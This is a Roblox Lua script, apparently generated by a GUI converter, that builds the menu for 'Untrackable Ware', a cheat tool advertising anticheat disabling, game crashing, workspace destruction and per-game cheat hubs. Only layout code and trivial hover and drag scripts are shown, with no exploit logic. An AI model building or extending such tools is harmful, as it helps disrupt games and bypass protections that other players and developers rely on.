local Untrackable = Instance.new("ScreenGui")
local Welcome = Instance.new("Frame")
local logo = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local TextButton = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local Folder = Instance.new("Folder")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local Main = Instance.new("Frame")
local TextLabel_4 = Instance.new("TextLabel")
local Logov2 = Instance.new("ImageLabel")
local Scroll = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local DA = Instance.new("TextButton")
local WSD = Instance.new("TextButton")
local SSSD = Instance.new("TextButton")
local GC = Instance.new("TextButton")
local FRC = Instance.new("TextButton")
local iy = Instance.new("TextButton")
local DD = Instance.new("TextButton")
local CH = Instance.new("TextButton")
local KY = Instance.new("TextButton")
local EC = Instance.new("TextButton")
local FC = Instance.new("TextButton")
local HM = Instance.new("TextButton")
local BC = Instance.new("TextButton")
local DC = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Cheathub = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local TextLabel_5 = Instance.new("TextLabel")
local Frame = Instance.new("Frame")
local ScrollingFrame_2 = Instance.new("ScrollingFrame")
local PSX = Instance.new("TextButton")
local mm2 = Instance.new("TextButton")
local los = Instance.new("TextButton")
local brookhaven = Instance.new("TextButton")
local sb = Instance.new("TextButton")
local ars = Instance.new("TextButton")
local AM = Instance.new("TextButton")
local TTD = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local TextButton_2 = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local UICorner_7 = Instance.new("UICorner")
local TextButton_3 = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local TextLabel_6 = Instance.new("TextLabel")
local AreYouSure = Instance.new("Frame")
local UICorner_9 = Instance.new("UICorner")
local TextLabel_7 = Instance.new("TextLabel")
local Y = Instance.new("TextButton")
local N = Instance.new("TextButton")
local TextLabel_8 = Instance.new("TextLabel")
local UICorner_10 = Instance.new("UICorner")
local TextLabel_9 = Instance.new("TextLabel")
local UICorner_11 = Instance.new("UICorner")
local Frame_2 = Instance.new("Frame")
local UICorner_12 = Instance.new("UICorner")
local TextLabel_10 = Instance.new("TextLabel")
local TextLabel_11 = Instance.new("TextLabel")

--Properties:

Untrackable.Name = "Untrackable"
Untrackable.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Untrackable.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Untrackable.DisplayOrder = 1
Untrackable.ResetOnSpawn = false

Welcome.Name = "Welcome"
Welcome.Parent = Untrackable
Welcome.Active = true
Welcome.AnchorPoint = Vector2.new(0.5, 0.5)
Welcome.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
Welcome.BorderColor3 = Color3.fromRGB(0, 0, 0)
Welcome.BorderSizePixel = 0
Welcome.Position = UDim2.new(0.49999699, 0, 0.5, 0)
Welcome.Size = UDim2.new(0, 486, 0, 268)

logo.Name = "logo"
logo.Parent = Welcome
logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
logo.BackgroundTransparency = 1.000
logo.BorderColor3 = Color3.fromRGB(0, 0, 0)
logo.BorderSizePixel = 0
logo.Position = UDim2.new(0, 0, 0.0102389082, 0)
logo.Size = UDim2.new(0, 49, 0, 50)
logo.Image = "rbxassetid://14443157895"
logo.ScaleType = Enum.ScaleType.Slice

UICorner.CornerRadius = UDim.new(0, 4)
UICorner.Parent = Welcome

TextButton.Parent = Welcome
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.291043758, 0, 0.657745838, 0)
TextButton.Size = UDim2.new(0, 200, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Okay"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

UICorner_2.CornerRadius = UDim.new(0, 2)
UICorner_2.Parent = TextButton

Folder.Parent = Welcome

TextLabel.Parent = Folder
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.203286752, 0, 0.194339409, 0)
TextLabel.Size = UDim2.new(0, 287, 0, 37)
TextLabel.Font = Enum.Font.Fondamento
TextLabel.Text = "Welcome.txt"
TextLabel.TextColor3 = Color3.fromRGB(109, 109, 109)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

TextLabel_2.Parent = Folder
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.286082834, 0, 0.00824458525, 0)
TextLabel_2.Size = UDim2.new(0, 204, 0, 58)
TextLabel_2.Font = Enum.Font.Nunito
TextLabel_2.Text = "Untrackable Ware"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

TextLabel_3.Parent = Folder
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.202831879, 0, 0.427404612, 0)
TextLabel_3.Size = UDim2.new(0, 287, 0, 37)
TextLabel_3.Font = Enum.Font.Unknown
TextLabel_3.Text = "A Roblox exploit"
TextLabel_3.TextColor3 = Color3.fromRGB(109, 109, 109)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

Main.Name = "Main"
Main.Parent = Untrackable
Main.Active = true
Main.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.261055082, 0, 0.204724416, 0)
Main.Size = UDim2.new(0, 542, 0, 299)
Main.Visible = false

TextLabel_4.Parent = Main
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_4.BorderSizePixel = 0
TextLabel_4.Position = UDim2.new(0.317343175, 0, 0, 0)
TextLabel_4.Size = UDim2.new(0, 200, 0, 50)
TextLabel_4.Font = Enum.Font.Nunito
TextLabel_4.Text = "Untrackable Ware"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14.000
TextLabel_4.TextWrapped = true

Logov2.Name = "Logov2"
Logov2.Parent = Main
Logov2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Logov2.BackgroundTransparency = 1.000
Logov2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Logov2.BorderSizePixel = 0
Logov2.Position = UDim2.new(0, 0, 0.00668896316, 0)
Logov2.Size = UDim2.new(0, 49, 0, 50)
Logov2.Image = "rbxassetid://14443157895"
Logov2.ScaleType = Enum.ScaleType.Slice

Scroll.Name = "Scroll"
Scroll.Parent = Main
Scroll.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
Scroll.BorderColor3 = Color3.fromRGB(0, 0, 0)
Scroll.BorderSizePixel = 0
Scroll.Position = UDim2.new(0.070110701, 0, 0.167224079, 0)
Scroll.Size = UDim2.new(0, 467, 0, 213)
Scroll.Style = Enum.FrameStyle.DropShadow

ScrollingFrame.Parent = Scroll
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Size = UDim2.new(0, 467, 0, 213)

DA.Name = "DA"
DA.Parent = ScrollingFrame
DA.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DA.BorderColor3 = Color3.fromRGB(0, 0, 0)
DA.BorderSizePixel = 0
DA.Size = UDim2.new(0, 112, 0, 47)
DA.Font = Enum.Font.Michroma
DA.Text = "Disable Anticheat (NOT ALL AC)"
DA.TextColor3 = Color3.fromRGB(0, 0, 0)
DA.TextScaled = true
DA.TextSize = 14.000
DA.TextWrapped = true

WSD.Name = "WSD"
WSD.Parent = ScrollingFrame
WSD.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WSD.BorderColor3 = Color3.fromRGB(0, 0, 0)
WSD.BorderSizePixel = 0
WSD.Position = UDim2.new(0.239828691, 0, 0, 0)
WSD.Size = UDim2.new(0, 112, 0, 47)
WSD.Font = Enum.Font.Michroma
WSD.Text = "WorkSpace Destroyer"
WSD.TextColor3 = Color3.fromRGB(0, 0, 0)
WSD.TextScaled = true
WSD.TextSize = 14.000
WSD.TextWrapped = true

SSSD.Name = "SSSD"
SSSD.Parent = ScrollingFrame
SSSD.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SSSD.BorderColor3 = Color3.fromRGB(0, 0, 0)
SSSD.BorderSizePixel = 0
SSSD.Position = UDim2.new(0.479657382, 0, 0, 0)
SSSD.Size = UDim2.new(0, 112, 0, 47)
SSSD.Font = Enum.Font.Michroma
SSSD.Text = "ServerScriptService Destroyer(CS)"
SSSD.TextColor3 = Color3.fromRGB(0, 0, 0)
SSSD.TextScaled = true
SSSD.TextSize = 14.000
SSSD.TextWrapped = true

GC.Name = "GC"
GC.Parent = ScrollingFrame
GC.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GC.BorderColor3 = Color3.fromRGB(0, 0, 0)
GC.BorderSizePixel = 0
GC.Position = UDim2.new(0.719486058, 0, 0, 0)
GC.Size = UDim2.new(0, 112, 0, 47)
GC.Font = Enum.Font.Michroma
GC.Text = "Game Crasher "
GC.TextColor3 = Color3.fromRGB(0, 0, 0)
GC.TextScaled = true
GC.TextSize = 14.000
GC.TextWrapped = true

FRC.Name = "FRC"
FRC.Parent = ScrollingFrame
FRC.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FRC.BorderColor3 = Color3.fromRGB(0, 0, 0)
FRC.BorderSizePixel = 0
FRC.Position = UDim2.new(0, 0, 0.112676054, 0)
FRC.Size = UDim2.new(0, 112, 0, 47)
FRC.Font = Enum.Font.Michroma
FRC.Text = "Fake Roblox Chat  (patched)"
FRC.TextColor3 = Color3.fromRGB(0, 0, 0)
FRC.TextScaled = true
FRC.TextSize = 14.000
FRC.TextWrapped = true

iy.Name = "iy"
iy.Parent = ScrollingFrame
iy.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
iy.BorderColor3 = Color3.fromRGB(0, 0, 0)
iy.BorderSizePixel = 0
iy.Position = UDim2.new(0.239828691, 0, 0.112676054, 0)
iy.Size = UDim2.new(0, 112, 0, 47)
iy.Font = Enum.Font.Michroma
iy.Text = "Load Infinite yield"
iy.TextColor3 = Color3.fromRGB(0, 0, 0)
iy.TextScaled = true
iy.TextSize = 14.000
iy.TextWrapped = true

DD.Name = "DD"
DD.Parent = ScrollingFrame
DD.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DD.BorderColor3 = Color3.fromRGB(0, 0, 0)
DD.BorderSizePixel = 0
DD.Position = UDim2.new(0.479657382, 0, 0.112676054, 0)
DD.Size = UDim2.new(0, 112, 0, 47)
DD.Font = Enum.Font.Michroma
DD.Text = "Dark Dex v3 (bypassed anti dex)"
DD.TextColor3 = Color3.fromRGB(0, 0, 0)
DD.TextScaled = true
DD.TextSize = 14.000
DD.TextWrapped = true

CH.Name = "CH"
CH.Parent = ScrollingFrame
CH.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CH.BorderColor3 = Color3.fromRGB(0, 0, 0)
CH.BorderSizePixel = 0
CH.Position = UDim2.new(0.719486058, 0, 0.112676054, 0)
CH.Size = UDim2.new(0, 112, 0, 47)
CH.Font = Enum.Font.Michroma
CH.Text = "Cheating Hub"
CH.TextColor3 = Color3.fromRGB(0, 0, 0)
CH.TextScaled = true
CH.TextSize = 14.000
CH.TextWrapped = true

KY.Name = "KY"
KY.Parent = ScrollingFrame
KY.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
KY.BorderColor3 = Color3.fromRGB(0, 0, 0)
KY.BorderSizePixel = 0
KY.Position = UDim2.new(0, 0, 0.225352108, 0)
KY.Size = UDim2.new(0, 112, 0, 47)
KY.Font = Enum.Font.Michroma
KY.Text = "Kick Yourself "
KY.TextColor3 = Color3.fromRGB(0, 0, 0)
KY.TextScaled = true
KY.TextSize = 14.000
KY.TextWrapped = true

EC.Name = "EC"
EC.Parent = ScrollingFrame
EC.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
EC.BorderColor3 = Color3.fromRGB(0, 0, 0)
EC.BorderSizePixel = 0
EC.Position = UDim2.new(0.239828691, 0, 0.225352108, 0)
EC.Size = UDim2.new(0, 112, 0, 47)
EC.Font = Enum.Font.Michroma
EC.Text = "Enable Collision (Client Side)"
EC.TextColor3 = Color3.fromRGB(0, 0, 0)
EC.TextScaled = true
EC.TextSize = 14.000
EC.TextWrapped = true

FC.Name = "FC"
FC.Parent = ScrollingFrame
FC.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FC.BorderColor3 = Color3.fromRGB(0, 0, 0)
FC.BorderSizePixel = 0
FC.Position = UDim2.new(0.479657382, 0, 0.225352108, 0)
FC.Size = UDim2.new(0, 112, 0, 47)
FC.Font = Enum.Font.Michroma
FC.Text = "Fire Character( patched )"
FC.TextColor3 = Color3.fromRGB(0, 0, 0)
FC.TextScaled = true
FC.TextSize = 14.000
FC.TextWrapped = true

HM.Name = "HM"
HM.Parent = ScrollingFrame
HM.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HM.BorderColor3 = Color3.fromRGB(0, 0, 0)
HM.BorderSizePixel = 0
HM.Position = UDim2.new(0.719486058, 0, 0.225352108, 0)
HM.Size = UDim2.new(0, 112, 0, 47)
HM.Font = Enum.Font.Michroma
HM.Text = "Hint Message (CS)"
HM.TextColor3 = Color3.fromRGB(0, 0, 0)
HM.TextScaled = true
HM.TextSize = 14.000
HM.TextWrapped = true

BC.Name = "BC"
BC.Parent = ScrollingFrame
BC.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BC.BorderColor3 = Color3.fromRGB(0, 0, 0)
BC.BorderSizePixel = 0
BC.Position = UDim2.new(0, 0, 0.338999987, 0)
BC.Size = UDim2.new(0, 112, 0, 47)
BC.Font = Enum.Font.Michroma
BC.Text = "Broadcast (CS)"
BC.TextColor3 = Color3.fromRGB(0, 0, 0)
BC.TextScaled = true
BC.TextSize = 14.000
BC.TextWrapped = true

DC.Name = "DC"
DC.Parent = ScrollingFrame
DC.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DC.BorderColor3 = Color3.fromRGB(0, 0, 0)
DC.BorderSizePixel = 0
DC.Position = UDim2.new(0.239999995, 0, 0.338999987, 0)
DC.Size = UDim2.new(0, 112, 0, 47)
DC.Font = Enum.Font.Michroma
DC.Text = "Dont Click"
DC.TextColor3 = Color3.fromRGB(0, 0, 0)
DC.TextScaled = true
DC.TextSize = 14.000
DC.TextWrapped = true

UICorner_3.CornerRadius = UDim.new(0, 3)
UICorner_3.Parent = Scroll

Cheathub.Name = "Cheat hub"
Cheathub.Parent = Main
Cheathub.AnchorPoint = Vector2.new(0.5, 0.5)
Cheathub.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
Cheathub.BorderColor3 = Color3.fromRGB(0, 0, 0)
Cheathub.BorderSizePixel = 0
Cheathub.Position = UDim2.new(0.501845002, 0, 0.498327762, 0)
Cheathub.Size = UDim2.new(0, 334, 0, 218)
Cheathub.Visible = false

UICorner_4.Parent = Cheathub

TextLabel_5.Parent = Cheathub
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_5.BorderSizePixel = 0
TextLabel_5.Position = UDim2.new(0.0628742501, 0, 0, 0)
TextLabel_5.Size = UDim2.new(0, 289, 0, 57)
TextLabel_5.Font = Enum.Font.Nunito
TextLabel_5.Text = "Untrackable Ware Cheat Hub"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14.000
TextLabel_5.TextWrapped = true

Frame.Parent = Cheathub
Frame.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.152694613, 0, 0.220183492, 0)
Frame.Size = UDim2.new(0, 234, 0, 146)

ScrollingFrame_2.Parent = Frame
ScrollingFrame_2.Active = true
ScrollingFrame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame_2.BackgroundTransparency = 1.000
ScrollingFrame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame_2.BorderSizePixel = 0
ScrollingFrame_2.Size = UDim2.new(0, 233, 0, 146)
ScrollingFrame_2.CanvasPosition = Vector2.new(0, 292)
ScrollingFrame_2.CanvasSize = UDim2.new(0, 0, 3, 0)

PSX.Name = "PSX"
PSX.Parent = ScrollingFrame_2
PSX.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PSX.BorderColor3 = Color3.fromRGB(0, 0, 0)
PSX.BorderSizePixel = 0
PSX.Position = UDim2.new(0, 0, 0.01369863, 0)
PSX.Size = UDim2.new(0, 234, 0, 38)
PSX.Font = Enum.Font.SourceSans
PSX.Text = "Pet Simulator X"
PSX.TextColor3 = Color3.fromRGB(0, 0, 0)
PSX.TextSize = 14.000

mm2.Name = "mm2"
mm2.Parent = ScrollingFrame_2
mm2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
mm2.BorderColor3 = Color3.fromRGB(0, 0, 0)
mm2.BorderSizePixel = 0
mm2.Position = UDim2.new(-0.0260000005, 0, 0.0920000002, 0)
mm2.Size = UDim2.new(0, 234, 0, 38)
mm2.Font = Enum.Font.SourceSans
mm2.Text = "MM2"
mm2.TextColor3 = Color3.fromRGB(0, 0, 0)
mm2.TextSize = 14.000

los.Name = "los"
los.Parent = ScrollingFrame_2
los.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
los.BorderColor3 = Color3.fromRGB(0, 0, 0)
los.BorderSizePixel = 0
los.Position = UDim2.new(-0.00899999961, 0, 0.174999997, 0)
los.Size = UDim2.new(0, 234, 0, 38)
los.Font = Enum.Font.SourceSans
los.Text = "Legends Of Speed"
los.TextColor3 = Color3.fromRGB(0, 0, 0)
los.TextSize = 14.000

brookhaven.Name = "brookhaven"
brookhaven.Parent = ScrollingFrame_2
brookhaven.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
brookhaven.BorderColor3 = Color3.fromRGB(0, 0, 0)
brookhaven.BorderSizePixel = 0
brookhaven.Position = UDim2.new(-0.00400000019, 0, 0.263000011, 0)
brookhaven.Size = UDim2.new(0, 234, 0, 38)
brookhaven.Font = Enum.Font.SourceSans
brookhaven.Text = "Brookhaven (Blatant, also other games)"
brookhaven.TextColor3 = Color3.fromRGB(0, 0, 0)
brookhaven.TextSize = 14.000

sb.Name = "sb"
sb.Parent = ScrollingFrame_2
sb.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
sb.BorderColor3 = Color3.fromRGB(0, 0, 0)
sb.BorderSizePixel = 0
sb.Position = UDim2.new(-0.0429184549, 0, 0.33561644, 0)
sb.Size = UDim2.new(0, 234, 0, 38)
sb.Font = Enum.Font.SourceSans
sb.Text = "Slap Battles"
sb.TextColor3 = Color3.fromRGB(0, 0, 0)
sb.TextSize = 14.000

ars.Name = "ars"
ars.Parent = ScrollingFrame_2
ars.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ars.BorderColor3 = Color3.fromRGB(0, 0, 0)
ars.BorderSizePixel = 0
ars.Position = UDim2.new(-0.0379999988, 0, 0.414999992, 0)
ars.Size = UDim2.new(0, 234, 0, 38)
ars.Font = Enum.Font.SourceSans
ars.Text = "Arsenal"
ars.TextColor3 = Color3.fromRGB(0, 0, 0)
ars.TextSize = 14.000

AM.Name = "AM"
AM.Parent = ScrollingFrame_2
AM.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AM.BorderColor3 = Color3.fromRGB(0, 0, 0)
AM.BorderSizePixel = 0
AM.Position = UDim2.new(-0.0299999993, 0, 0.5, 0)
AM.Size = UDim2.new(0, 234, 0, 38)
AM.Font = Enum.Font.SourceSans
AM.Text = "Adopt Me!"
AM.TextColor3 = Color3.fromRGB(0, 0, 0)
AM.TextSize = 14.000

TTD.Name = "TTD"
TTD.Parent = ScrollingFrame_2
TTD.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TTD.BorderColor3 = Color3.fromRGB(0, 0, 0)
TTD.BorderSizePixel = 0
TTD.Position = UDim2.new(-0.0300429184, 0, 0.589041114, 0)
TTD.Size = UDim2.new(0, 234, 0, 38)
TTD.Font = Enum.Font.SourceSans
TTD.Text = "Toilet Tower Defense"
TTD.TextColor3 = Color3.fromRGB(0, 0, 0)
TTD.TextSize = 14.000

UICorner_5.Parent = Frame

TextButton_2.Parent = Cheathub
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.934131742, 0, -0.0458715595, 0)
TextButton_2.Size = UDim2.new(0, 31, 0, 26)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "X"
TextButton_2.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true

UICorner_6.Parent = TextButton_2

UICorner_7.CornerRadius = UDim.new(0, 4)
UICorner_7.Parent = Main

TextButton_3.Parent = Main
TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.963099658, 0, -0.0301003344, 0)
TextButton_3.Size = UDim2.new(0, 32, 0, 27)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "X"
TextButton_3.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true

UICorner_8.CornerRadius = UDim.new(0, 2)
UICorner_8.Parent = TextButton_3

TextLabel_6.Parent = Main
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.BorderSizePixel = 0
TextLabel_6.Position = UDim2.new(0.304428041, 0, 0.896321058, 0)
TextLabel_6.Size = UDim2.new(0, 236, 0, 31)
TextLabel_6.Font = Enum.Font.Nunito
TextLabel_6.Text = "discord: crystal.dev (NO TAGS)"
TextLabel_6.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_6.TextScaled = true
TextLabel_6.TextSize = 14.000
TextLabel_6.TextWrapped = true

AreYouSure.Name = "AreYouSure"
AreYouSure.Parent = Main
AreYouSure.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
AreYouSure.BorderColor3 = Color3.fromRGB(0, 0, 0)
AreYouSure.BorderSizePixel = 0
AreYouSure.Position = UDim2.new(0.295202941, 0, 0.260869563, 0)
AreYouSure.Size = UDim2.new(0, 222, 0, 144)
AreYouSure.Visible = false

UICorner_9.CornerRadius = UDim.new(0, 2)
UICorner_9.Parent = AreYouSure

TextLabel_7.Parent = AreYouSure
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_7.BorderSizePixel = 0
TextLabel_7.Position = UDim2.new(0.0450450443, 0, 0, 0)
TextLabel_7.Size = UDim2.new(0, 200, 0, 50)
TextLabel_7.Font = Enum.Font.Nunito
TextLabel_7.Text = "Are you sure you want to exit?"
TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.TextScaled = true
TextLabel_7.TextSize = 14.000
TextLabel_7.TextWrapped = true

Y.Name = "Y"
Y.Parent = AreYouSure
Y.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Y.BorderColor3 = Color3.fromRGB(0, 0, 0)
Y.BorderSizePixel = 0
Y.Position = UDim2.new(0.175675675, 0, 0.472222209, 0)
Y.Size = UDim2.new(0, 146, 0, 31)
Y.Font = Enum.Font.Garamond
Y.Text = "Yes"
Y.TextColor3 = Color3.fromRGB(0, 0, 0)
Y.TextScaled = true
Y.TextSize = 14.000
Y.TextWrapped = true

N.Name = "N"
N.Parent = AreYouSure
N.BackgroundColor3 = Color3.fromRGB(136, 255, 0)
N.BorderColor3 = Color3.fromRGB(0, 0, 0)
N.BorderSizePixel = 0
N.Position = UDim2.new(0.175675675, 0, 0.6875, 0)
N.Size = UDim2.new(0, 146, 0, 31)
N.Font = Enum.Font.Garamond
N.Text = "No"
N.TextColor3 = Color3.fromRGB(0, 0, 0)
N.TextScaled = true
N.TextSize = 14.000
N.TextWrapped = true

TextLabel_8.Parent = Untrackable
TextLabel_8.BackgroundColor3 = Color3.fromRGB(8, 243, 255)
TextLabel_8.BackgroundTransparency = 0.250
TextLabel_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_8.BorderSizePixel = 0
TextLabel_8.Position = UDim2.new(0.0148083623, 0, 0.0216535442, 0)
TextLabel_8.Rotation = -2.000
TextLabel_8.Size = UDim2.new(0, 136, 0, 38)
TextLabel_8.Font = Enum.Font.Unknown
TextLabel_8.Text = "Untrackable"
TextLabel_8.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_8.TextScaled = true
TextLabel_8.TextSize = 14.000
TextLabel_8.TextWrapped = true

UICorner_10.CornerRadius = UDim.new(0, 1)
UICorner_10.Parent = TextLabel_8

TextLabel_9.Parent = TextLabel_8
TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.BackgroundTransparency = 1.000
TextLabel_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_9.BorderSizePixel = 0
TextLabel_9.Position = UDim2.new(0.174401969, 0, 0.48384586, 0)
TextLabel_9.Size = UDim2.new(0, 87, 0, 30)
TextLabel_9.Font = Enum.Font.Unknown
TextLabel_9.Text = "Ware"
TextLabel_9.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_9.TextScaled = true
TextLabel_9.TextSize = 14.000
TextLabel_9.TextWrapped = true

UICorner_11.CornerRadius = UDim.new(0, 3)
UICorner_11.Parent = TextLabel_9

Frame_2.Parent = Untrackable
Frame_2.AnchorPoint = Vector2.new(0.5, 0.5)
Frame_2.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.499564469, 0, 0.499015749, 0)
Frame_2.Size = UDim2.new(0, 323, 0, 195)
Frame_2.Visible = false

UICorner_12.Parent = Frame_2

TextLabel_10.Parent = Frame_2
TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.BackgroundTransparency = 1.000
TextLabel_10.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_10.BorderSizePixel = 0
TextLabel_10.Position = UDim2.new(0.19195047, 0, 0, 0)
TextLabel_10.Size = UDim2.new(0, 200, 0, 50)
TextLabel_10.Font = Enum.Font.Nunito
TextLabel_10.Text = "UntrackableWare"
TextLabel_10.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_10.TextScaled = true
TextLabel_10.TextSize = 14.000
TextLabel_10.TextWrapped = true

TextLabel_11.Parent = Frame_2
TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.BackgroundTransparency = 1.000
TextLabel_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_11.BorderSizePixel = 0
TextLabel_11.Position = UDim2.new(0.0650154799, 0, 0.256410271, 0)
TextLabel_11.Size = UDim2.new(0, 278, 0, 96)
TextLabel_11.Font = Enum.Font.TitilliumWeb
TextLabel_11.Text = "You're game is not loaded! yet!. Please wait till the game is loaded, then we run the key screen!"
TextLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.TextScaled = true
TextLabel_11.TextSize = 14.000
TextLabel_11.TextWrapped = true

-- Scripts:

local function AZGYF_fake_script() -- Welcome.ifmouse 
	local script = Instance.new('Script', Welcome)

	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = 0.5
	end)
	wait(2)
	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = 0
	end)
end
coroutine.wrap(AZGYF_fake_script)()
local function DAZYEH_fake_script() -- Welcome.Script 
	local script = Instance.new('Script', Welcome)

	local z = script.Parent
	
	z.Active = true
	z.Selectable = true
	z.Draggable = true
end
